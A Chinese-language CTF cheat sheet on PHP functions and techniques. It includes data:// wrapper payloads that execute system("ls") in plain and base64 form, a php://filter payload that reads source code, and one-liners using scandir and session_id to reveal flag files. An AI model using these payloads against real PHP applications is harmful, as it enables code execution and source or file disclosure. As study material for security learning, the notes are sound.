# 基本函数

## preg_replace

正则替换

preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    )

## **isset()** 

函数用于检测变量是否已设置并且非 NULL。

## **file_get_contents()** 

把整个文件读入一个字符串中。

#### **file_get_contents($text,'r')**

'r' 表示以只读模式打开文件

`$text` 是一个变量，它用于存储文件的路径或文件名。

在 `file_get_contents($text, 'r')` 中，`$text` 是一个参数，表示要打开和读取的文件的路径或名称。

## $function = @$_GET['f'];

从GET请求中获取 'f' 参数的值。 '@' 符号用于抑制错误消息，以防 'f' 未设置时出现错误。





# PHP伪协议

## data协议

常用格式：

data://text/plain,xxxx(要执行的php代码)

data://text/plain;base64,xxxx(base64编码后的数据)

例如：

?page=data://text/plain,
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=

?page=data://text/plain,<?php%20system("ls")?>

?text=data://text/plain,I have a dream 实现$text中有"I have a dream"

## filter伪协议

file=php://filter/convert.base64-encode/resource=next.php

# 常用的语句

**通过scandir 以扫描当前目录下的文件**

highlight_file(next(array_reverse(scandir(pos(localeconv())))));

**session_id传cookie**

highlight_file( session_id(session_start())); 

cookie:PHPSESSID=flag.php  